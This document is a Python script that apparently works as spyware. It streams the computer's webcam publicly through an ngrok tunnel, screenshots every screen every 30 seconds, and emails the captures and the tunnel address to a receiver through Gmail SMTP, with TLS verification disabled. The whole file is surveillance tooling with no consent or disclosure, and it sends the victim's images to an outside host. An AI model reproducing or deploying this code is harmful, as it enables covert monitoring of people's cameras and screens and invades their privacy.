# Imports
import cv2, pyngrok, flask, ssl, os, threading, pyautogui, mimetypes, smtplib, datetime, time
from pyngrok import ngrok, conf, installer
from flask import Flask, Response, render_template
from email.message import EmailMessage
from email.mime.text import MIMEText
from functools import partial
from PIL import ImageGrab, Image

pyngrok_config = conf.get_default()

if not os.path.exists(pyngrok_config.ngrok_path):
    myssl = ssl.create_default_context();
    myssl.check_hostname=False
    myssl.verify_mode=ssl.CERT_NONE
    installer.install_ngrok(pyngrok_config.ngrok_path, context=myssl)

# Setup
app = Flask(__name__)
cap = cv2.VideoCapture(0)
flag = False

# Take screenshot of desktop
def takeImage():
    ImageGrab.grab = partial(ImageGrab.grab, all_screens=True)
    im = pyautogui.screenshot()
    im.save("C:/Users/Public/Pictures/3.png")
    return (str(datetime.datetime.now()))

# Write and send email
def sendEmail(date):
    sender = "XX" # Sender Email Address
    secret = "XX" # Secret Key
    receiver = "XX" # Receiver Email Adress
    subject = f"{date}"
    body = f"{public_url}"
    email = EmailMessage()
    email['From'] = sender
    email['To'] = receiver
    email['Subject'] = subject
    email.set_content(body)
    attach_file_to_email(email, "C:/Users/Public/Pictures/3.png")
    context = ssl._create_unverified_context()
    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
        smtp.login(sender, secret)
        smtp.sendmail(sender, receiver, email.as_string())

# Attach photo to email
def attach_file_to_email(email, filename):
    with open(filename, 'rb') as fp:
        file_data = fp.read()
        maintype, _, subtype = (mimetypes.guess_type(filename)[0] or 'application/octet-stream').partition("/")
        email.add_attachment(file_data, maintype=maintype, subtype=subtype, filename=filename)
        
# For webcam access
def generate_frames():
    try:
        while True:
            success, frame = cap.read()
            if not success:
                break
            _, buffer = cv2.imencode('.jpg', frame) # Encode the frame as JPEG
            frame_bytes = buffer.tobytes() # Convert the frame to bytes
            yield (b'--frame\r\n'         # Yield the frame bytes as a response
                   b'Content-Type: image/jpeg\r\n\r\n' + frame_bytes + b'\r\n')
    except:
        pass # Filler as except is required

def generate_screenshot():
    ImageGrab.grab = partial(ImageGrab.grab, all_screens=True)
    im = pyautogui.screenshot()

# Thread 1 for webcam stream
def t1():
    app.run(host='0.0.0.0', port=5000)

# Thread 2 for desktop screenshot
def t2():
    while True:
        tempImageName = takeImage()
        sendEmail(tempImageName)
        time.sleep(30)

# Flash run
@app.route('/')
def index():
    return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')

# Create ngrok tunnel
ngrok.set_auth_token("XX") # Ngrok Authentication Token 
public_url = ngrok.connect(addr="5000", proto="http")
print(" * ngrok tunnel \"{}\" -> \"http://127.0.0.1:{}/\"".format(public_url, 5000))

# Main run
if __name__ == '__main__':
    thread1 = threading.Thread(target=t1)
    thread2 = threading.Thread(target=t2)
    thread1.start()
    thread2.start()

